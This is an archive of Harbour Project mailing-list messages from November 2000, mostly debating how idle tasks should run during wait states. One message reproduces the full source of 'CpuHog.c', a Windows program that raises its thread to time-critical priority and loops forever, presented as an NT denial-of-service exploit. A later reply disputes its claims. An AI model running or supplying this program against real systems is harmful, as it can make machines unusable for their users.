mean that Harbour will not be able to offer "infinitely" growing Dynamic
Stack in DOS.

This will not change anything because DOS doesn't have the "infinite" memory
pool to begin with.

It will simply mean that a reasonable Stack Size will be used in DOS.

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 15:44:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 15:44:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com>
Message-ID: <3A1D8154.288B7DA6@libero.it>

Ron,

I don't think so. I think that an idle task is a light weight thread. It
has to run indefinitely.

Having to add an explicit call to make something run when it should
already be running is cumbersome. 

Onidle.prg, with 5 or 6 idle tasks running was using less than 1% of my
Celeron 433 at work. So cpu usage is not an issue. 

Your solution simply stops your program and is surely the right one were
harbour multithreading. Since harbour is not multithreading (and I think
it will take a _loooong_ time before it becomes) idle tasks are our
threads.

I don't need to tell OS/2 to go on to next thread every time I'm waiting
for a key and as such I don't want to be forced to tell to HVM to
execute next idle task when it should already be running it.

We need to assure that HVM is not using more cpu than it needs but it
has to use as much as it needs and not less. 

If I add one thousand idle tasks and then my program is simply an
Inkey(0) statement it's fine as long as it works and my customers don't
complain that they cannot listen to mp3s while using my program :-))


regards.

Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> Isn't it better if *when* such need arise, the developer will *explicitly*
> indicate such?
> 
> We can easily add hb_idleReset() and HB_IDLE_RESET(), so that at the end of
> your Idle Tasks, you can explicitly request recurring processing, by
> resetting at will!
> 
> Here is a [modified] example (from onidle.prg):
> 
> nH1 = HB_IDLEADD( {|| DEVPOS(0,01), DEVOUT( TIME() ), HB_IDLE_RESET()} )
>                                                           ^^^
> 
> Here is what HB_IDLE_RESET() will look like:
> 
> // ------ //
> HB_FUNC( HB_IDLE_RESET )
> {
>    if( hb_vm_uiIdleTask == hb_vm_uiIdleMaxTask )
>    {
>       hb_vm_uiIdleTask = 0;
>       hb_vm_bCollectGarbage = TRUE;
>    }
> }
> // ------ //
> 
> I don't think it is wise/efficient to force such redundant reoccurrence
> unless explicitly requested.
> 
> This proposal will be far more O/S friendly and will still allow the
> developer to force reoccurrence if needed.
> 
> Ron
> 
> > I don't like the idea that if I call inkey(0) my idle task will be
> > called only once (I'm rebuilding right now, so I'll make some test later
> > :-)).
> >
> > I'd like idle tasks to be some "poor man threads" and so be called every
> > time hb_idleState is entered (one at a time).
> >
> > I think that this should be changed.
> >
> > regards.
> >
> > PS. onidle.prg inside \tests\ should have a running time counter, I
> > can't test it right now, but I fear latest changes will make it stop
> > after first call.
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 15:47:01 2000
From: harbour@lists.harbour-project.org (Felipe G. Coury)
Date: Thu Nov 23 15:47:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGFDHAA.ron@profit-master.com>
Message-ID: <05d201c05597$c4ff9240$3c01a8c0@creation>

Maurilio,

> What if the developer dose *not* want *his* Idle Block to be evaluated
> repeatedly per Wait State? Don't you think it should be allowed? What do
you
> think should be the default?
As an "outlooker", I will give my opinion: I think Ron's point is right. I
think in most cases you'll not want repeatedly Idle Block evaluation. I
think having such hability is the exception and don't having is the rule and
being so, you can override it with a simple command like HB_IDLE_RESET(). I
think it makes perfectly sense.

Regards,

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
http://www.creation.com.br

--------------------------------------------
Visite o GuiaBrasil.Net:
http://www.guiabrasil.net
--------------------------------------------



From harbour@lists.harbour-project.org  Thu Nov 23 15:52:01 2000
From: harbour@lists.harbour-project.org (Felipe G. Coury)
Date: Thu Nov 23 15:52:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGFDHAA.ron@profit-master.com> <05d201c05597$c4ff9240$3c01a8c0@creation>
Message-ID: <05e601c05598$5c11bc30$3c01a8c0@creation>

> As an "outlooker", I will give my opinion: I think Ron's point is right. I
> think in most cases you'll not want repeatedly Idle Block evaluation. I
> think having such hability is the exception and don't having is the rule
and
> being so, you can override it with a simple command like HB_IDLE_RESET().
I
> think it makes perfectly sense.
And maybe a SET() parameter also may be nice. Like SET IDLE TO
[STATIC|RECURRING] or something like that.

Also maybe all I am saying is "nonsense", but I am just an user...

Regards,

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
http://www.creation.com.br

--------------------------------------------
Visite o GuiaBrasil.Net:
http://www.guiabrasil.net
--------------------------------------------



From harbour@lists.harbour-project.org  Thu Nov 23 15:54:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 15:54:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGFDHAA.ron@profit-master.com>
Message-ID: <3A1D83D8.AD40C340@libero.it>

Ron,

from my point of view idle state is not a measure of time, I mean I
don't know how long is _a_ wait state and in how many pieces I can break
it down.

Wait state is all the time that it takes to get next key from user. It
can be hours, days or 1/10 of a second depending on circumstances.

If you want something that gets executed only once before waiting next
user key you simply write

my_func_only_once()
inkey(0)

I do understand that this is not the very same thing as an idle task
executed only once per every Inkey(.xx) you have in your code.

But I think that is more "natural" to have an idle task that runs when
there is nothing to do. Think of a spooler, a counter, a clock, a serial
monitor (less good as example).

regards.



Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> > Ron, Ryszard,
> >
> > I don't want to change my
> >
> > cChar := Inkey(0)
> >
> > with
> >
> > while (cChar := Inkey(.1)) <> ""
> >       hb_IdleState()
> > enddo
> >
> > its cumbersome.
> 
> You don't have to! You can easily force reoccurrence by adding
> HB_IDLE_RESET() to your Idle Block.
> 
> > Idle task should be a "fire and forget" thing. Start them and rest
> > assured that as soon as you have a long enough pause they will be
> > called.
> 
> What if the developer dose *not* want *his* Idle Block to be evaluated
> repeatedly per Wait State? Don't you think it should be allowed? What do you
> think should be the default?
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 15:56:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 15:56:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com> <3A1D8154.288B7DA6@libero.it>
Message-ID: <048501c0558f$fe1ea780$0a0ac8c8@VECWS1>

Maurilio, Ron,

I agree with you. I think the idle handling in Harbour should be 
something similar to the CA-Clipper implementation.

I think the previous Harbour solution was better than the current 
one.

One extension to the previous one, could be to accept a granularity 
parameter when calling HB_IDLEADD(), and call the idle function 
according to this value. The default would be to call it as often as 
possible.

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 15:58:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 15:58:01 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKOEGADHAA.ron@profit-master.com>
Message-ID: <04a101c05590$3ddb55d0$0a0ac8c8@VECWS1>

Here's the utility, which is considered a severe NT security exploit (that's 
why it was removed from the site, which previous name was www.ntinternals.com):

//============================================================================
//
// CpuHog.c
//
// Copyright (C) 1996 Mark Russinovich
//
// How vulnerable is NT? Here is a 5 line program, runnable from a
// guest account, that instantly cripples an NT system. Once started, no
// other program will run, and there is no way to stop it. No, not even 
// task manager can get a shot at the CPU after CpuHog is off and running!
//
//============================================================================
#include <windows.h>


//---------------------------------------------------------
//
// main
//
// Set thread to highest priority allowed for programs
// that run without administrative privilege and just sit
// in a loop.
//
//---------------------------------------------------------
int WINAPI WinMain( HINSTANCE hInstance, 
       HINSTANCE hPrevInstance, 
       LPSTR lpCmdLine,
       int nCmdShow )
{
 MessageBox( NULL, "CpuHog V1.0\n\nCopyright (C) 1996 Mark Russinovich\n"
     "http://www.ntinternals.com", "CpuHog", MB_OK );
 SetThreadPriority( GetCurrentThread(),
   THREAD_PRIORITY_TIME_CRITICAL );
 while(1);

 // never get here
 return 0;
}

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 15:58:31 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 15:58:31 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <000701c0546d$f9b60d00$0f2aa8c0@fivetechs>
References: <000601c0546c$fca5cf60$0f2aa8c0@fivetechs>
Message-ID: <200011232057.VAA14124@pyxis.wanadoo.be>

Hi Antonio

 
> I missed ChildLevel() source code. It is here:
> 
> function ChildLevel( o, oClass )
> 
> return If( o:IsDerivedFrom( oClass ), 1, 0 )

Ok, I founded the error :-) I will publish the new classes.c within a 
few moments.

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 16:00:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 16:00:04 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKOEGADHAA.ron@profit-master.com> <047001c0558d$26410940$0a0ac8c8@VECWS1>
Message-ID: <3A1D853D.1EE05B1B@libero.it>

Victor,

under OS/2 you can force the OS not to give boost to foreground threads
(default is to have a boost for foreground thread and for threads which
are rescheduled after an I/O operation completes). 

If you don't have boosts and you have two running threads (let's say two
programs which draw a mandelbrot set) then they will go at half the
speed (a little less) that each one would be able to achieve were it the
only one to run.

If this is acceptable it is completely up to your expectations. :-) You
can always buy a faster cpu :-D

regards.


Victor Szakats ha scritto:
> 
> Ron,
> 
> > Do you have exact link? I couldn't find it.
> >
> > Any way, the ability of any task, to hog a Pre-Emptive O/S, is clearly an
> > O/S bug.
> 
> It was a bug yes, but note that after the OS fix, the OS was still hogged.
> 
> I can't find it right now (it was several years ago), but I'll dig it up from my
> archives.
> 
> > Generally speaking, Pre-Emptive O/S should be able to execute multiple
> > applications, each consisting of the following:
> >
> > while( 1 );
> >
> > Without any adverse effect on the O/S responsiveness.
> 
> It would, but would such an app allow the others to run at an acceptable
> speed ?
> 
> Victor Szakats
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 16:16:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 16:16:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com> <3A1D8154.288B7DA6@libero.it> <048501c0558f$fe1ea780$0a0ac8c8@VECWS1>
Message-ID: <3A1D88EC.6B6E1C13@libero.it>

Victor,

I'd like to merge your idea with the one from Felipe and so I'm asking:
why don't we add a parameter to hb_idleAdd() which is not a granularity
index (remember, and idle task could never be called or could be called
thousands of times per second) but instead a flag which, if true, causes
the idle task to be executed only once per wait state?

regards.



Victor Szakats ha scritto:
> 
> Maurilio, Ron,
> 
> I agree with you. I think the idle handling in Harbour should be
> something similar to the CA-Clipper implementation.
> 
> I think the previous Harbour solution was better than the current
> one.
> 
> One extension to the previous one, could be to accept a granularity
> parameter when calling HB_IDLEADD(), and call the idle function
> according to this value. The default would be to call it as often as
> possible.
> 
> Victor Szakats
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 16:19:02 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 16:19:02 2000
Subject: [Harbour] 2000-11-23 23:11 UTC+0100 jfl (mafact) <jfl@mafact.com>
In-Reply-To: <200011232057.VAA14124@pyxis.wanadoo.be>
References: <000701c0546d$f9b60d00$0f2aa8c0@fivetechs>
Message-ID: <200011232118.WAA21789@pyxis.wanadoo.be>

2000-11-23 23:11 UTC+0100 jfl (mafact) <jfl@mafact.com>
   * source/vm/classes.c
     * corrected hb___msgClsParent( void )
       where some pointer was badly deallocated


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 16:39:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 16:39:02 2000
Subject: [Harbour] 2000-11-23 13:15 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D88EC.6B6E1C13@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEGIDHAA.ron@profit-master.com>

2000-11-23 13:15 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/rtl/idle.c
     + Added HB_IDLE_RESET() and logic to reset Idle Processing upon such
explicit request.
     ! If reoccurring processing of Idle Blocks is requested,
hb_releaseCPU() is executed upon completion of each cycle.

   * tests/onidle.prg
     + Added HB_IDLE_RESET() to demonstrate explicit request for reoccurring
processing of Idle Blocks.

Maurilio, can you please review this change, and try tests/onidle.prg now...


From harbour@lists.harbour-project.org  Thu Nov 23 16:41:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 16:41:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKCEGFDHAA.ron@profit-master.com>
Message-ID: <3A1D8EA9.CDCB4F85@libero.it>

Ron,

let's find a solution which lets every one decide if an idle task should
run indefinitely or only once. 

What do you think of a change to hb_idle_add() to pass a parameter which
causes that particular idle task to be executed only once per inkey(0)
or inkey(sometime) invocation?

regards.

Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> > Ron,
> >
> > I tried tests\onidle.prg with your last code. Running time counter is
> > blocked. I think you should revert to last code calling an idle task
> > per hb_idleState() invocation.
> >
> > We don't need to add a new set of functions; before your code onidle.prg
> > had a running counter without any noticeable cpu use (under OS/2 there
> > is a graph of cpu usage always visible).
> >
> > As it is now idle task have no use at all.
> 
> The above is not necessarily correct. I don't think it is reasonable to
> assume that an Idle Block *must* be reevaluated *repeatedly* per single Wait
> State.
> 
> I *do* agree that it should be *allowed*, but I don't think this should be
> the *default* behavior.
> 
> There might be many valid uses of such Idle Blocks where one invocation per
> Wait State *is* the desired behavior, and we should allow it too. In fact I
> think that should be the default.
> 
> > PS. You know you've reached perfection when there is nothing more to
> > remove, not when there is nothing more to add :-)
> 
> Right, but we are not even close to perfection here, because, if I as a
> developer didn't mean for my Idle Block to be repeatedly executed per Wait
> State, I had no way of doing so.
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 16:44:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 16:44:04 2000
Subject: [Harbour] 2000-11-23 13:15 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKCEGIDHAA.ron@profit-master.com>
Message-ID: <3A1D8F4C.8D6981B6@libero.it>

Ron,

I'm downloading it right now, I'll build everything right after. 

Please read my previous message about hb_idle_add() change.

regards and thanks.


Ron Pinkas ha scritto:
> 
> 2000-11-23 13:15 UTC+0800 Ron Pinkas <ron@profit-master.com>
>    * source/rtl/idle.c
>      + Added HB_IDLE_RESET() and logic to reset Idle Processing upon such
> explicit request.
>      ! If reoccurring processing of Idle Blocks is requested,
> hb_releaseCPU() is executed upon completion of each cycle.
> 
>    * tests/onidle.prg
>      + Added HB_IDLE_RESET() to demonstrate explicit request for reoccurring
> processing of Idle Blocks.
> 
> Maurilio, can you please review this change, and try tests/onidle.prg now...
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 16:51:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 16:51:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com> <3A1D8154.288B7DA6@libero.it> <048501c0558f$fe1ea780$0a0ac8c8@VECWS1> <3A1D88EC.6B6E1C13@libero.it>
Message-ID: <04c801c05597$ae451700$0a0ac8c8@VECWS1>

Maurilio, Ron,


> I'd like to merge your idea with the one from Felipe and so I'm asking:
> why don't we add a parameter to hb_idleAdd() which is not a granularity
> index (remember, and idle task could never be called or could be called
> thousands of times per second) but instead a flag which, if true, causes
> the idle task to be executed only once per wait state?

Thinking about it: What's the point in calling the idle state only once 
per wait state ?

I mean it's the same if I'd call my bunch of idle functions just 
before every inkey() calls. What is that good for at all ?

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 17:04:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 17:04:02 2000
Subject: [Harbour] 2000-11-23 13:15 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKCEGIDHAA.ron@profit-master.com> <3A1D8F4C.8D6981B6@libero.it>
Message-ID: <3A1D9423.905E8D21@libero.it>

Sorry Ron,

it doesn't work. idle task is called only once.

regards.

Maurilio Longo ha scritto:
> 
> Ron,
> 
> I'm downloading it right now, I'll build everything right after.
> 
> Please read my previous message about hb_idle_add() change.
> 
> regards and thanks.
> 
> Ron Pinkas ha scritto:
> >
> > 2000-11-23 13:15 UTC+0800 Ron Pinkas <ron@profit-master.com>
> >    * source/rtl/idle.c
> >      + Added HB_IDLE_RESET() and logic to reset Idle Processing upon such
> > explicit request.
> >      ! If reoccurring processing of Idle Blocks is requested,
> > hb_releaseCPU() is executed upon completion of each cycle.
> >
> >    * tests/onidle.prg
> >      + Added HB_IDLE_RESET() to demonstrate explicit request for reoccurring
> > processing of Idle Blocks.
> >
> > Maurilio, can you please review this change, and try tests/onidle.prg now...
> >
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> 
> --
> 
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 17:04:34 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 17:04:34 2000
Subject: [Harbour] VC++ compiler and harboury.c problem ...
Message-ID: <202011232149.0ANLn5A30734@localhost.localdomain>

Hi,

I'm trying to recompile Harbour with MSVC++ 6.0 and receive many 
errors like ;

obj\vc\harboury.c(237) : warning C4129: 'c' : 
unrecognized character escape sequence

reading the Bison generated c code I read ;

#line 279 "source\compiler\harbour.sly"

wich seem to fool VC++

Any Idea ?


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 17:06:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 17:06:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com> <3A1D8154.288B7DA6@libero.it> <048501c0558f$fe1ea780$0a0ac8c8@VECWS1> <3A1D88EC.6B6E1C13@libero.it> <04c801c05597$ae451700$0a0ac8c8@VECWS1>
Message-ID: <3A1D949C.D8C66B52@libero.it>

Yes Victor,

I've said the same thing a few messages ago, but then again, if someone
wants an idle task which is called only once, then this is a possible
solution.

regards.


Victor Szakats ha scritto:
> 
> Maurilio, Ron,
> 
> > I'd like to merge your idea with the one from Felipe and so I'm asking:
> > why don't we add a parameter to hb_idleAdd() which is not a granularity
> > index (remember, and idle task could never be called or could be called
> > thousands of times per second) but instead a flag which, if true, causes
> > the idle task to be executed only once per wait state?
> 
> Thinking about it: What's the point in calling the idle state only once
> per wait state ?
> 
> I mean it's the same if I'd call my bunch of idle functions just
> before every inkey() calls. What is that good for at all ?
> 
> Victor Szakats
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 17:23:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 17:23:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com> <3A1D8154.288B7DA6@libero.it> <048501c0558f$fe1ea780$0a0ac8c8@VECWS1> <3A1D88EC.6B6E1C13@libero.it>
Message-ID: <04b501c05594$102d9f40$0a0ac8c8@VECWS1>

Maurilio,


> I'd like to merge your idea with the one from Felipe and so I'm asking:
> why don't we add a parameter to hb_idleAdd() which is not a granularity
> index (remember, and idle task could never be called or could be called
> thousands of times per second) but instead a flag which, if true, causes
> the idle task to be executed only once per wait state?

I think that's a good idea, as long as the default is the old method.

BTW, IIRC CA-Clipper has some similar stuff internally.

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 17:24:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 17:24:03 2000
Subject: [Harbour] 2000-11-23 13:15 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D9423.905E8D21@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEGJDHAA.ron@profit-master.com>

Maurilio,

Are you sure?

It works perfectly here! I can see the time etc. refreshed repeatedly.

???

Ron

> Sorry Ron,
> 
> it doesn't work. idle task is called only once.
> 
> regards.
> 
> Maurilio Longo ha scritto:


From harbour@lists.harbour-project.org  Thu Nov 23 17:32:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 17:32:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D8EA9.CDCB4F85@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEGKDHAA.ron@profit-master.com>

Maurilio,

Yes. It will be great, but involves a more complex logic. We will need to
maintain an additional array of structure holding 2 BOOL elements, the 1st
holding the requested passed setting, and the other indicating whether the
Block was evaluated in this cycle. Then we need a way to reset that 2nd
element at the end of the Wait State in inkey.c.

The cost is that we will have to repeatedly scan all blocks and check this
status, which is far more expensive than the current solution.

It is very doable...

Ron

> Ron,
>
> let's find a solution which lets every one decide if an idle task should
> run indefinitely or only once.
>
> What do you think of a change to hb_idle_add() to pass a parameter which
> causes that particular idle task to be executed only once per inkey(0)
> or inkey(sometime) invocation?
>
> regards.


From harbour@lists.harbour-project.org  Thu Nov 23 17:50:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 17:50:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A1D949C.D8C66B52@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEGKDHAA.ron@profit-master.com>

Victor, Maurilio,

Just to clarify, we are talking about once *per* Wait State.

I find it curious, that one can live with the fact that such Idle Block is
*not* guaranteed to run at all, yet is so concerned with it not running
multiple times per Wait State!

Remember, it might *not* even run once!!!

If we apply the most strict optimization, which is run it once per Wait
State and yield, We stand better chances of it running at all!

Clocks, etc., should *not* be implemented by means of Idle Block. If a
process requires constant CPU resources, it should instead register a timer
with O/S.

Which brings me to the conclusion, that even if we implement the additional
parameter to HB_IDLEADD(), the default should be NON repeating.

Ron

> Yes Victor,
>
> I've said the same thing a few messages ago, but then again, if someone
> wants an idle task which is called only once, then this is a possible
> solution.
>
> regards.
>
>
> Victor Szakats ha scritto:
> >
> > Maurilio, Ron,
> >
> > > I'd like to merge your idea with the one from Felipe and so
> I'm asking:
> > > why don't we add a parameter to hb_idleAdd() which is not a
> granularity
> > > index (remember, and idle task could never be called or could
> be called
> > > thousands of times per second) but instead a flag which, if
> true, causes
> > > the idle task to be executed only once per wait state?
> >
> > Thinking about it: What's the point in calling the idle state only once
> > per wait state ?
> >
> > I mean it's the same if I'd call my bunch of idle functions just
> > before every inkey() calls. What is that good for at all ?
> >
> > Victor Szakats
> >
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
>
> --
>
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Thu Nov 23 17:59:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 17:59:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGKDHAA.ron@profit-master.com>
Message-ID: <04e201c055a1$38338510$0a0ac8c8@VECWS1>

Ron,

We'd a feature in Harbour which was more or less the same 
purpose as the FT_ONIDLE() well known CA-Clipper function.

Now for some unknown reasons (fixing something which 
already worked for years ?), we have a new approach here.

My question is why wasn't it good as it was ?
What will this fix ?
Why create a new purpose for the idle task feature ?
Why question the validity of something which was working for 
many people in many apps ?

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 18:00:07 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:00:07 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011231758_MC2-BBFF-3389@compuserve.com>

Victor,

"Here's the utility, which is considered a severe NT security exploit"

I have to say I'm unimpressed.  Also, that surely should be "was".

"// Set thread to highest priority allowed for programs
// that run without administrative privilege and just sit
// in a loop."

Says it all.

" SetThreadPriority( GetCurrentThread(),
   THREAD_PRIORITY_TIME_CRITICAL );"

If that's allowed to a non-privileged user, then that's the bug.
What this does:

" while(1);"

is then entirely reasonable.

BTW, I am almost certain it does not in fact hog all the CPU.  You can
expect interrupts to be serviced.  Also, very probably some system
threads.  And any other THREAD_PRIORITY_TIME_CRITICAL threads will
share the CPU with the above.  Some of the claims about the code look
more than suspect!

I'm assuming NT did once allow the above even for a supposedly
non-privileged user, which is a poor situation but not quite the
mess people appear to have claimed.  Real-time systems are supposed
to allow time critical threads. :-)  And real-time systems often do
not have the concept of both privileged & non-privileged users, so
all that's really wrong is that NT does claim to have both types of
user yet the settings were once not what non-real-time people would
expect.  (Which doesn't completely excuse the world's biggest s/w
company for making this foul up.)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:01:24 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:01:24 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011231758_MC2-BBFF-338A@compuserve.com>

Maurilio,

"I think that is more "natural" to have an idle task that runs when
there is nothing to do. Think of a spooler, a counter, a clock, a serial
monitor (less good as example)."

Those are poor examples, in a decent (proper <g>) OS, because they
would not run as "idle" tasks.

That word "idle" is surely a hint.  People appear to be talking about
at least 2 things: background (low priority) processing and true idle
time.  It may be hard to reconcile these if only one term is used to
mean both of them!

